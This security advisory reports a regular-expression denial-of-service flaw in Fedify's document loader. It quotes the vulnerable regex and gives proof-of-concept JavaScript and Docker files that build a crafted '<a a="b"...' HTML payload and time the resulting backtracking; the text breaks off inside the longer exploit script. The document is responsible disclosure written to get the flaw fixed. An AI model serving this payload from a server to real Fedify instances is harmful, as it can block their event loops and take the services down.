summary: "Fedify has ReDoS Vulnerability in HTML Parsing Regex\nHi Fedify team! \U0001F44B\n\
  \nThank you for your work on Fedify—it's a fantastic library for building federated applications.\
  \ While reviewing the codebase, I discovered a Regular Expression Denial of Service (ReDoS)\
  \ vulnerability that I'd like to report. I hope this helps improve the project's security.\n\
  \n---\n\n## Summary\n\nA Regular Expression Denial of Service (ReDoS) vulnerability exists\
  \ in Fedify's document loader. The HTML parsing regex at `packages/fedify/src/runtime/docloader.ts:259`\
  \ contains nested quantifiers that cause catastrophic backtracking when processing maliciously\
  \ crafted HTML responses. \n\n**An attacker-controlled federated server can respond with a\
  \ small (~170 bytes) malicious HTML payload that blocks the victim's Node.js event loop for\
  \ 14+ seconds, causing a Denial of Service.**\n\n| Field | Value |\n|-------|-------|\n| **CWE**\
  \ | CWE-1333 (Inefficient Regular Expression Complexity) |\n\n---\n\n## Details\n\n### Vulnerable\
  \ Code\n\nThe vulnerability is located in `packages/fedify/src/runtime/docloader.ts`, lines\
  \ 258-264:\n\n```typescript\n// Line 258-259: Vulnerable regex with nested quantifiers\nconst\
  \ p =\n  /<(a|link)((\\s+[a-z][a-z:_-]*=(\"[^\"]*\"|'[^']*'|[^\\s>]+))+)\\s*\\/?>/ig;\n\n\
  // Line 261: No size limit on response body\nconst html = await response.text();\n\n// Line\
  \ 264: Regex execution loop\nwhile ((m = p.exec(html)) !== null) rawAttribs.push(m[2]);\n\
  ```\n\n### Root Cause Analysis\n\nThe regex has **nested quantifiers with alternation**, which\
  \ is a classic ReDoS pattern:\n\n```\n/<(a|link)((\\s+[a-z][a-z:_-]*=(\"[^\"]*\"|'[^']*'|[^\\\
  s>]+))+)\\s*\\/?>/ig\n                                                        ^^\n       \
  \                                            Outer quantifier (+)\n           ^^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\
  \                     Inner pattern with alternation\n```\n\n- **Outer quantifier**: `((\\\
  s+...)+)` - one or more groups of attributes\n- **Inner alternation**: `(\"[^\"]*\"|'[^']*'|[^\\\
  s>]+)` - multiple ways to match attribute values\n\nWhen the regex fails to match (e.g., an\
  \ incomplete HTML tag), the regex engine backtracks exponentially through all possible ways\
  \ the nested pattern could have matched.\n\n### Attack Vector\n\n1. Victim's Fedify application\
  \ calls `lookupObject(\"https://attacker.com/@user\")` to fetch an actor profile\n2. Attacker's\
  \ server responds with `Content-Type: text/html`\n3. The code path: `lookupObject()` → `documentLoader()`\
  \ → `getRemoteDocument()` → HTML parsing (lines 258-287)\n4. Line 261: `response.text()` reads\
  \ the entire body without size limits\n5. Line 264: Regex execution triggers catastrophic\
  \ backtracking\n6. Event loop is blocked for seconds to minutes, causing DoS\n\n### Why This\
  \ Is Exploitable\n\n- **No response size limit**: The HTML body is read entirely via `response.text()`\
  \ without Content-Length validation\n- **No timeout by default**: `AbortSignal` is optional\
  \ and not enforced\n- **Remote exploitation**: Attacker just needs the victim to fetch from\
  \ their URL\n- **No authentication required**: Federation commonly involves fetching profiles\
  \ from untrusted servers\n- **Amplifiable**: Multiple concurrent requests can fully disable\
  \ the service\n\n---\n\n## PoC\n\n### Quick Reproduction (Node.js)\n\nYou can verify this\
  \ vulnerability with the following standalone script:\n\n```javascript\n/**\n * Fedify ReDoS\
  \ Vulnerability - Minimal PoC\n * \n * This script reproduces the vulnerable regex from docloader.ts\n\
  \ * and demonstrates exponential time complexity.\n */\n\n// The vulnerable regex from docloader.ts:259\n\
  const VULNERABLE_REGEX = /<(a|link)((\\s+[a-z][a-z:_-]*=(\"[^\"]*\"|'[^']*'|[^\\s>]+))+)\\\
  s*\\/?>/ig;\n\n/**\n * Generate malicious HTML payload\n * Pattern: <a a=\"b\" a=\"b\" a=\"\
  b\"... (trailing space, no closing >)\n */\nfunction generateMaliciousPayload(repetitions)\
  \ {\n  return '<a' + ' a=\"b\"'.repeat(repetitions) + ' ';\n}\n\n/**\n * Simulate the vulnerable\
  \ code path from docloader.ts lines 262-264\n */\nfunction simulateVulnerableCodePath(html)\
  \ {\n  const p = /<(a|link)((\\s+[a-z][a-z:_-]*=(\"[^\"]*\"|'[^']*'|[^\\s>]+))+)\\s*\\/?>/ig;\n\
  \  let m;\n  const rawAttribs = [];\n  while ((m = p.exec(html)) !== null) {\n    rawAttribs.push(m[2]);\n\
  \  }\n  return rawAttribs;\n}\n\n// Test with increasing payload sizes\nconsole.log('Fedify\
  \ ReDoS Vulnerability PoC\\n');\nconsole.log('Repetitions | Payload Size | Time');\nconsole.log('------------|--------------|--------');\n\
  \nfor (const reps of [18, 20, 22, 24, 26, 28]) {\n  const payload = generateMaliciousPayload(reps);\n\
  \  const start = performance.now();\n  simulateVulnerableCodePath(payload);\n  const elapsed\
  \ = performance.now() - start;\n  \n  const timeStr = elapsed >= 1000 \n    ? `${(elapsed\
  \ / 1000).toFixed(2)}s` \n    : `${elapsed.toFixed(0)}ms`;\n  \n  console.log(`${String(reps).padEnd(11)}\
  \ | ${String(payload.length + ' bytes').padEnd(12)} | ${timeStr}`);\n  \n  // Stop if it's\
  \ taking too long\n  if (elapsed > 15000) break;\n}\n```\n\n### Expected Output\n\n```\nFedify\
  \ ReDoS Vulnerability PoC\n\nRepetitions | Payload Size | Time\n------------|--------------|--------\n\
  18          | 111 bytes    | 14ms\n20          | 123 bytes    | 51ms\n22          | 135 bytes\
  \    | 224ms\n24          | 147 bytes    | 852ms\n26          | 159 bytes    | 3.26s\n28 \
  \         | 171 bytes    | 14.10s\n```\n\nTime approximately **quadruples every 2 additional\
  \ repetitions**, demonstrating O(2^n) complexity.\n\n### Full Docker-Based PoC\n\nFor a complete\
  \ demonstration, here are the Docker files to run the PoC in an isolated environment:\n\n\
  <details>\n<summary><strong>Dockerfile</strong></summary>\n\n```dockerfile\n# Dockerfile for\
  \ Fedify ReDoS Vulnerability PoC\nFROM node:20-slim\nLABEL description=\"PoC for Fedify ReDoS\
  \ vulnerability (CWE-1333)\"\n\nWORKDIR /poc\nCOPY exploit.js .\n\nCMD [\"node\", \"exploit.js\"\
  ]\n```\n\n</details>\n\n<details>\n<summary><strong>exploit.js</strong> (Full Version)</summary>\n\
  \n```javascript\n/**\n * Exploit Script for Fedify ReDoS PoC\n * \n * This script demonstrates\
  \ the ReDoS vulnerability in Fedify's\n * document loader by measuring the time it takes to\
  \ process\n * malicious HTML responses with varying payload sizes.\n */\n\n// The vulnerable\
  \ regex from docloader.ts:259\nconst VULNERABLE_REGEX = /<(a|link)((\\s+[a-z][a-z:_-]*=(\"\
  [^\"]*\"|'[^']*'|[^\\s>]+))+)\\s*\\/?>/ig;\n\n/**\n * Generate malicious HTML payload\n */\n\
  function generateMaliciousHtml(repetitions) {\n  return '<a' + ' a=\"b\"'.repeat(repetitions)\
  \ + ' ';\n}\n\n/**\n * Generate normal HTML\n */\nfunction generateNormalHtml() {\n  return\
  \ `<!DOCTYPE html>\n<html>\n<head>\n  <link rel=\"alternate\" type=\"application/activity+json\"\
  \ href=\"/user.json\">\n</head>\n<body><a href=\"/\">Home</a></body>\n</html>`;\n}\n\n/**\n\
  \ * Simulate the vulnerable code path from docloader.ts\n */\nfunction simulateVulnerableCodePath(html)\
  \ {\n  const p = /<(a|link)((\\s+[a-z][a-z:_-]*=(\"[^\"]*\"|'[^']*'|[^\\s>]+))+)\\s*\\/?>/ig;\n\
  \  const p2 = /\\s+([a-z][a-z:_-]*)=(\"([^\"]*)\"|'([^']*)'|([^\\s>]+))/ig;\n  \n  let m;\n\
  \  const rawAttribs = [];\n  while ((m = p.exec(html)) !== null) {\n    rawAttribs.push(m[2]);\n\
  \  }\n  \n  return rawAttribs;\n}\n\n/**\n * Run a single test and measure execution time\n\
  \ */\nfunction runTest(html, description) {\n  const start = process.hrtime.bigint();\n  \n\
  \  try {\n    simulateVulnerableCodePath(html);\n  } catch (e) {\n    // Ignore errors\n \
  \ }\n  \n  const end = process.hrtime.bigint();\n  const durationMs = Number(end - start)\
  \ / 1_000_000;\n  \n  return {\n    description,\n    durationMs,\n    payloadLength: html.length\n\
  \  };\n}\n\n/**\n * Print separator\n */\nfunction printSeparator() {\n  console.log('─'.repeat(60));\n\
  }\n\n/**\n * Main exploit function\n */\nasync function main() {\n  console.log('\\n╔══════════════════════════════════════════════════════════╗');\n\
  \  console.log('║        Fedify ReDoS Vulnerability PoC                    ║');\n  console.log('║\
  \        CWE-1333: Inefficient Regular Expression          ║');\n  console.log('╚══════════════════════════════════════════════════════════╝\\\
  n');\n\n  console.log('[*] Vulnerability Location:');\n  console.log('    File: packages/fedify/src/runtime/docloader.ts');\n\
  \  console.log('    Lines: 259-264');\n  console.log('');\n  \n  printSeparator();\n  console.log('[*]\
  \ Testing normal HTML response...');\n  printSeparator();\n  \n  const normalHtml = generateNormalHtml();\n\
  \  const normalResult = runTest(normalHtml, 'Normal HTML');\n  console.log(`[+] Normal request\
  \ completed in ${normalResult.durationMs.toFixed(2)}ms`);\n  console.log(`    Payload size:\
